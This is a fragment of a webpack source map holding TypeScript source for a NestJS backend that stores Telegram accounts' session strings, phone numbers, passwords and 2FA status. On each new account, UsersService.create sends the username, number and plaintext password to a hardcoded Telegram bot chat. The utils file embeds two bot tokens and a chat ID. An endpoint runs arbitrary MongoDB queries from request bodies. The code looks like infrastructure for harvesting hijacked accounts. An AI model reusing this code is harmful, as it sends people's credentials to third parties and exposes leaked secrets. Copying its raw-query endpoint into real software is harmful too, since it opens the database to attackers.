(!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserData> {\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\n        if (!deletedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserData[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.userDataModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.userDataModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\n                $set: {\n                    totalCount: 10,\n                    limitTime: Date.now(),\n                    paidReply: true\n                }\n            });\n        } catch (error) {\n            parseError(error)\n        }\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n\n  \n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  async findAll() {\n    return this.usersService.findAll();\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { fetchWithTimeout, ppplbot } from '../../utils';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) {}\n\n  async create(user: CreateUserDto): Promise<User> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout, parseError, ppplbot } from '../utils';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","import axios, { AddressFamily, AxiosRequestConfig } from 'axios';\n\nexport function sleep(ms) {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\nexport function contains(str, arr) {\n  return (arr.some(element => {\n    if (str?.includes(element)) {\n      return true;\n    }\n    return false;\n  }))\n};\n\n\nexport async function fetchWithTimeout(resource: string, options: AxiosRequestConfig = {}, maxRetries = 1) {\n  options.timeout = options.timeout || 50000;\n  options.method = options.method || 'GET';\n\n  const fetchWithProtocol = async (url: string, version: AddressFamily) => {\n    const source = axios.CancelToken.source();\n    const id = setTimeout(() => {\n      source.cancel(`Request timed out after ${options.timeout}ms`);\n    }, options.timeout);\n\n    try {\n      const response = await axios({\n        ...options,\n        url,\n        headers: { 'Content-Type': 'application/json' },\n        cancelToken: source.token,\n        family: version\n      });\n      clearTimeout(id);\n      return response;\n    } catch (error) {\n      clearTimeout(id);\n      console.log(`Error at URL (IPv${version}): `, url);\n      parseError(error);\n      if (axios.isCancel(error)) {\n        console.log('Request canceled:', error.message, url);\n        return undefined;\n      }\n      throw error; // Rethrow the error to handle retry logic outside\n    }\n  };\n\n  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {\n    try {\n      // First try with IPv4\n      const responseIPv4 = await fetchWithProtocol(resource, 4);\n      if (responseIPv4) return responseIPv4;\n\n      // If IPv4 fails, try with IPv6\n      const responseIPv6 = await fetchWithProtocol(resource, 6);\n      if (responseIPv6) return responseIPv6;\n    } catch (error) {\n      console.log(\"Error at URL : \", resource)\n      const errorDetails = parseError(error)\n      if (retryCount < maxRetries && error.code !== 'ERR_NETWORK' && error.code !== \"ECONNABORTED\" && error.code !== \"ETIMEDOUT\" && !errorDetails.message.toLowerCase().includes('too many requests') && !axios.isCancel(error)) {\n        console.log(`Retrying... (${retryCount + 1}/${maxRetries})`);\n        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay\n      } else {\n        console.log(`All ${maxRetries + 1} retries failed for ${resource}`);\n        return undefined;\n      }\n    }\n  }\n}\n\nexport function toBoolean(value: string | number | boolean): boolean {\n  if (typeof value === 'string') {\n    return value.toLowerCase() === 'true';\n  }\n  if (typeof value === 'number') {\n    return value === 1;\n  }\n  return value\n}\n\nexport function fetchNumbersFromString(inputString) {\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  if (matches) {\n    const result = matches.join('');\n    return result;\n  } else {\n    return '';\n  }\n}\n\nexport function parseError(\n  err,\n  prefix = 'TgCms',\n) {\n  let status = 'UNKNOWN';\n  let message = 'An unknown error occurred';\n  let error = 'UnknownError';\n\n  const extractMessage = (data) => {\n    if (Array.isArray(data)) {\n      const messages = data.map((item) => extractMessage(item));\n      return messages.filter((message) => message !== undefined).join(', ');\n    } else if (typeof data === 'string') {\n      return data;\n    } else if (typeof data === 'object' && data !== null) {\n      let resultString = ''\n      for (const key in data) {\n        const value = data[key]\n        if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {\n          resultString = resultString + data[key].join(', ');\n        } else {\n          const result = extractMessage(value);\n          if (result) {\n            resultString = resultString + result;\n          }\n        }\n      }\n      return resultString\n    }\n    return JSON.stringify(data);\n  };\n\n  if (err.response) {\n    const response = err.response;\n    status =\n      response.data?.status ||\n      response.status ||\n      err.status ||\n      'UNKNOWN';\n    message =\n      response.data?.message ||\n      response.data?.errors ||\n      response.errorMessage ||\n      response.message ||\n      response.statusText ||\n      response.data ||\n      err.message ||\n      'An error occurred';\n    error =\n      response.data?.error ||\n      response.error ||\n      err.name ||\n      err.code ||\n      'Error';\n  } else if (err.request) {\n    status = err.status || 'NO_RESPONSE';\n    message = err.data?.message ||\n      err.data?.errors ||\n      err.message ||\n      err.statusText ||\n      err.data ||\n      err.message || 'The request was triggered but no response was received';\n    error = err.name || err.code || 'NoResponseError';\n  } else if (err.message) {\n    status = err.status || 'UNKNOWN';\n    message = err.message;\n    error = err.name || err.code || 'Error';\n  } else if (err.errorMessage) {\n    status = err.status || 'UNKNOWN';\n    message = err.errorMessage;\n    error = err.name || err.code || 'Error';\n  }\n\n  const msg = `${prefix ? `${prefix} ::` : \"\"} ${extractMessage(message)} `\n\n  const resp = { status, message: err.errorMessage || msg, error };\n  console.log(resp.error == 'RPCError' ? resp.message : resp);\n  return resp\n}\nlet botCount = 0;\n\nexport function ppplbot(chatId?: string, botToken?: string) {\n  let token = botToken;\n\n  if (!token) {\n    if (botCount % 2 === 1) {\n      token = 'bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY';\n    } else {\n      token = 'bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA';\n    }\n    botCount++;\n  }\n  const targetChatId = chatId || '-1001801844217'; // Replace with actual chat ID\n  const apiUrl = `https://api.telegram.org/${token}/sendMessage?chat_id=${targetChatId}`;\n  return apiUrl;\n};\n\nexport const defaultReactions = [\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\n  '👀', '🙈', '🤝', '🤗', '🆒',\n  '🗿', '🙉', '🙊', '🤷', '👎'\n]\nexport const defaultMessages = [\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n];\n\nexport function areJsonsNotSame(json1: any, json2: any): boolean {\n  const keysToIgnore = [\"id\", \"_id\"];\n\n  function deepCompare(obj1: any, obj2: any): boolean {\n    if (obj1 === obj2) return true;\n\n    if (typeof obj1 !== \"object\" || typeof obj2 !== \"object\" || obj1 === null || obj2 === null) {\n      return false;\n    }\n\n    const keys1 = Object.keys(obj1).filter(key => !keysToIgnore.includes(key)).sort();\n    const keys2 = Object.keys(obj2).filter(key => !keysToIgnore.includes(key)).sort();\n\n    if (keys1.length !== keys2.length) return false;\n\n    return keys1.every(key => deepCompare(obj1[key], obj2[key]));\n  }\n\n  return !deepCompare(json1, json2);\n}\n\nexport function mapToJson(map: Map<any, any>) {\n  // Convert Map to a plain object\n  const obj: Record<string, any> = {};\n  for (const [key, value] of map.entries()) {\n    // Convert key to string since JSON keys are always strings\n    obj[String(key)] = value;\n  }\n  return obj\n}\n","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","import { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  app.use((req, res, next) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(8000);\n}\nbootstrap();\n"],"names":["MailReader","isReady","result","this","imap","Imap","user","process","env","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","on","console","log","err","error","getInstance","instance","connectToMail","connect","parseError","disconnectFromMail","end","isMailReady","getCode","sleep","openInbox","searchCriteria","fetchOptions","bodies","markSeen","results","Promise","resolve","reject","search","length","fetch","msg","seqno","emailData","stream","info","buffer","chunk","toString","which","push","seq","addFlags","expunge","once","split","fetchNumbersFromString","openBox","AppController","constructor","appService","commonServicePath","join","__dirname","getHello","uploadFileAndUpdate","file","targetDir","filePath","existsSync","mkdirSync","recursive","fileBuffer","readFile","path","writeFile","message","Get","Post","UseInterceptors","FileInterceptor","storage","diskStorage","destination","req","cb","folderPath","filename","ApiOperation","summary","ApiConsumes","ApiBody","schema","type","properties","format","UploadedFile","Controller","AppService","AppModule","configure","consumer","apply","LoggerMiddleware","forRoutes","Module","imports","initModule","TelegramModule","ActiveChannelsModule","ClientModule","UserDataModule","UsersModule","BufferClientModule","ArchivedClientModule","ChannelsModule","PromoteClientModule","BuildModule","UpiIdModule","PromoteMsgModule","PromoteStatModule","StatModule","Stat2Module","TgSignupModule","TransactionModule","NpointModule","controllers","providers","exports","Injectable","CloudinaryService","resources","Map","cloudinary","v2","config","cloud_name","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","name","getResourcesFromFolder","downloadAndExtractZip","url","zipPath","extractPath","response","fetchWithTimeout","responseType","status","Error","fs","writeFileSync","data","AdmZip","extractAllTo","unlinkSync","folderName","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","uploader","upload","resource_type","overwrite","invalidate","public_id","findAndSaveResources","api","prefix","max_results","all","map","async","resource","set","extension","substring","lastIndexOf","rootPath","cwd","mypath","res","statusText","saveFile","create_folder","uploadPromises","Array","from",